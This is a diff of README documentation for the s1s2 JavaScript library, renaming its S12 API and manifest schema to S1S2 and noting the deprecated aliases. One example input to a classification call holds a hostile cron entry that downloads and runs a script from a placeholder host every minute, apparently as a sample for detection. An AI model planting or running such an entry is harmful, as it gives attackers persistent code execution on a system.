@@ -17,9 +17,9 @@ A manifest task (any label set; tokens optional), and a margin policy whose thre
 ```
 
 ```js
-import { S12, thresholdFromQuantile } from "s1s2";
+import { S1S2, thresholdFromQuantile } from "s1s2";
 
-const lib = await S12.load({ manifest: "manifests/my-model.json" });      // runtime "auto"
+const lib = await S1S2.load({ manifest: "manifests/my-model.json" });      // runtime "auto"
 const s = await lib.decide({ input: "Arrived late, but works great.", questions: ["sentiment"] }, { escalate: true });
 
 s.answers[0];               // illustrative values
@@ -41,7 +41,7 @@ const t = thresholdFromQuantile(devAnswers.map((a) => a.margin), 0.15);
 The CT0 manifest without tasks, with plain Decisions-API questions:
 
 ```js
-const lib = await S12.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });
+const lib = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });
 const s = await lib.decide({
   input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
   questions: [
@@ -75,8 +75,8 @@ never escalates. `decide(..., { escalate: true })` applies the manifest's policy
 carry `target`, an engine for `{ build }`). Thresholds without a `to` are refused.
 
 - `to: { build: "<name>" }`: the low-margin questions are read again on that build of the same manifest (fresh
-  prefill there), and its answer replaces the System-1 one. `S12.load` loads the build on first use, once, and frees
-  it with `lib.dispose()`; `S12.fromBackend` instances need `withBuildLoader(fn)`. A second graph in memory is a real
+  prefill there), and its answer replaces the System-1 one. `S1S2.load` loads the build on first use, once, and frees
+  it with `lib.dispose()`; `S1S2.fromBackend` instances need `withBuildLoader(fn)`. A second graph in memory is a real
   cost (an int8 graph is roughly twice an int4 one).
 - `to: "generate"`: System 2 on the same weights, greedy, after the decision prompt **without** the decided answer
   (manifest `generation.escalate`, else `generation.continue` with an empty answer), with `prompt` (default:
@@ -219,7 +219,9 @@ backend the kept prefill is reused (`sharedPrefill: true`, `reusedTokens` = deci
 Node with CUDA → genai, transformers.js; Node CPU → transformers.js, decode-only. genai does not run on
 onnxruntime-node CPU. `litert` and `webllm` are only picked when asked for (`runtime` or `build`).
 
-## Manifest (`schema: "s12.manifest/1"`)
+## Manifest (`schema: "s1s2.manifest/1"`)
+
+The deprecated id `"s12.manifest/1"` (before the rename to s1s2) is still accepted; `s1s2 validate` reports it as a warning. `S12` is a deprecated alias of `S1S2`, and `$S12_CACHE` of `$S1S2_CACHE`.
 
 Validated at load (`validateManifest`, every problem listed). Then the loader asserts: the tokenizer's encoding of
 every manifest token (EOS, yes/no, level tokens, kev delimiters) equals the manifest id; tagged-encoding markers are
